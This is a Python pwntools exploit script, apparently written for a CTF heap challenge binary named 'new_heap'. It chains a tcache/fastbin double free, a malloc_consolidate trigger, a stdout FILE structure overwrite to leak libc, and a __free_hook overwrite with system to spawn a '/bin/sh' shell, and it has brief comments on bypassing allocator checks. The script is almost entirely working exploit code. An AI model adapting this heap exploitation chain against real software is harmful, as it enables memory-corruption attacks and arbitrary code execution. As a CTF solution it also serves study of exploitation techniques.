#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './new_heap'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('3.exit')
    io.send(str(idx).ljust(7, '\0'))

def new(sz, cont):
    menu(1)
    io.recvuntil(":")
    io.sendline(str(sz))
    io.recvuntil(":")
    io.send(cont)

def free(idx):
    menu(2)
    io.recvuntil(":")
    io.sendline(str(idx))

io.recvuntil("good present for African friends:")
char = int(io.recvuntil("\n", drop = True), 16) - 0x2

new(0x78, '0' * 8)
new(0x78, '1' * 8)
new(0x78, '2' * 8)
new(0x78, '3' * 8)
new(0x78, '\x00' * 0x58 + p64(0x81)) # bypass the malloc_consolidate checking
new(0x38, '5' * 0x38) # this will be inside it
new(0x78, '\x00' * 0x18 + p64(0x61)) # bypass the malloc_consolidate checking
new(0x78, '7' * 8)
new(0x78, '8' * 8)

free(0)
free(1)
free(2)
free(3)
free(4)
free(6)
free(7)

free(8) # added into the fastbin list
new(0x78, '\0' * 8) # 9 new heap will be selected from the tcache list
free(8) # trigger double free, added into the tcache list
new(0x78, '\xb0' + chr(char + 0x4)) # 10 it will have heap addr in its FD

# no setbuf(stdin, 0), so, getchar() will do malloc(0x1000),
# which will trigger malloc_consolidate()
menu(3)
io.recvuntil("sure?")
io.sendline('n')

free(5)
new(0x18, 'a' * 0x18) # 11
new(0x8, '\x50\x77') # overwrite fastbin's fd
new(0x38, 'b') # 13
new(0x38, p64(0) * 2 + p64(0xfbad1800)+p64(0)*3+p8(0)) # overwrite stdout to leak

io.recvn(8)
libc_addr = myu64(io.recvn(8)) - 0x3ed8b0
libc.address = libc_addr
log.info("\033[33m" + hex(libc_addr) + "\033[0m")
gdb.attach(io, '')

new(0x38, p64(0) * 3 + p64(0x81) + p64(libc.symbols['__free_hook'])) # overwrite tcache's fd
new(0x78, '/bin/sh') # 16
new(0x78, p64(libc.symbols['system'])) # 18 overwrite free hook
free(16)



gdb.attach(io, '')





io.interactive()
